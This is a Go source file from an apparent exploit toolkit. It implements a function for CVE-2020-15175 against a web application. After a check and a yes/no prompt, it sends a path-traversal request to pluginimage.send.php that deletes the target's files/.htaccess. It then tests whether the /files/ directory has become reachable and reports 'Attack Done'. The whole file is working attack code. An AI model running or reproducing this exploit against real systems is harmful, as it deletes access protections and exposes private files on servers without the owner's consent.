package exploits

import (
	"fmt"
)

func CVE202015175(target string) {
	if CheckCVE202015175(target) {
		var rep string
		fmt.Printf("You are going to delete " + target + "/files/.htaccess. Are you sure ? [Y,n] ")
		_, err := fmt.Scanf("%s", &rep)
		if err != nil {
			fmt.Println("Error in reading user input, i said no")
			rep = "n"
		}
		if rep == "n" || rep == "N" {
			fmt.Println("Canceled by user")
		} else {

			MakeRequest(target+"/front/pluginimage.send.php?plugin=..&name=.htaccess&clean", true)
			fmt.Println(MakeRequest(target+"/files/", true))
			if MakeRequest(target+"/files/", true) == 200 {
				fmt.Println("Attack Done, check " + target + "/files")
			} else {
				fmt.Print("The target seems not to take care of the .htaccess file\nExploit Failed...")

			}

		}

	}
}
